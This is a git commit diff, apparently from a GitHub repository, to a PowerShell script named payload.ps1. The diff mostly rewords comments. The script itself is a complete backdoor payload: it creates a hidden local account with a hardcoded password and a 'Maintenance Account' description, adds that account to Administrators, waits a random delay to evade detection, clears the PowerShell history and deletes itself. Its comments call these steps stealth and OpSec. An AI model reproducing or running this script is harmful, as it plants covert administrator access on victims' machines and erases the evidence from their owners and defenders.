1bda4f0e2f731a15e4af83c2613a0db62260b372
johnnyab1 <125665412+johnnyab1@users.noreply.github.com>
2024-11-21 12:21:54 +0200

    payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,21 +1,22 @@
-# Define username and password
+# username and password
 $user = "VmUser"
 $pass = "HSTS765$#Hsjh"
-# Create the new user with the specified password
+
+# Creating the user using PowerShell for stealth
 New-LocalUser -Name $user -Password (ConvertTo-SecureString $pass -AsPlainText -Force) -AccountNeverExpires -Description "Maintenance Account"
 
-# Add the new user to the Administrators group
+# Adding the user to the Administrators group
 Add-LocalGroupMember -Group "Administrators" -Member $user
 
-# Optional: Implement a random delay to avoid detection patterns
+# Random delay to avoid pattern recognition
 Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 300)
 
-# Optional: Clear PowerShell history to remove traces
+# Clean up traces of the script execution for OpSec
 $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
 if (Test-Path $historyPath) {
     Clear-Content -Path $historyPath
 }
 
-# Optional: Self-delete the script for operational security
+# Self-deletion of the script for OpSec
 $myInvocation = (Get-Variable MyInvocation -Scope 1).Value
 Remove-Item $myInvocation.MyCommand.Path
